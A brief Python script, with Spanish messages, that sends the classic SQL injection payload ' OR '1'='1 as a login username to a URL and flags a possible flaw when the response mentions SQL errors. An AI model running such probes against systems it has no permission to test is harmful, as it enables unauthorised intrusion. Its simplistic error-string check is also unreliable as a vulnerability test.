import requests

url = "http://example.com/login"
payload = "' OR '1'='1"

def sql_injection_scan(target_url, injection_payload):
    params = {"username": injection_payload, "password": "test"}
    
    response = requests.get(target_url, params=params)
    
    if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
        print("Posible vulnerabilidad de inyección SQL encontrada en:", target_url)
    else:
        print("No se encontró vulnerabilidad de inyección SQL en:", target_url)

sql_injection_scan(url, payload)
